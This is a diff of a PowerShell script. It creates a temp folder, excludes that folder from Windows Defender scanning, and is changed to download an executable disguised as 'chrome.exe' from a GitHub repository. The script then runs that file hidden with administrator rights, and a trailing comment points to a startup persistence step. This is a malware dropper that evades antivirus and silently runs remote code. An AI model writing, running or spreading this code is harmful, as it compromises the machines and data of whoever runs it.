@@ -11,9 +11,9 @@ new-item -itemtype directory -path "$env:temp\newfolder" -force | out-null
 
 add-mppreference -exclusionpath "$env:temp\newfolder"
 
-invoke-webrequest -uri "telegram.com" -outfile "$env:temp\newfolder\telegram.exe" | out-null
+invoke-webrequest -uri "https://github.com/lion93934/test/raw/refs/heads/main/chrome.exe" -outfile "$env:temp\newfolder\chrome.exe" | out-null
 
-start-process -filepath "$env:temp\newfolder\telegram.exe" -windowstyle hidden -verb runas
+start-process -filepath "$env:temp\newfolder\chrome.exe" -windowstyle hidden -verb runas
 
 # startup
 
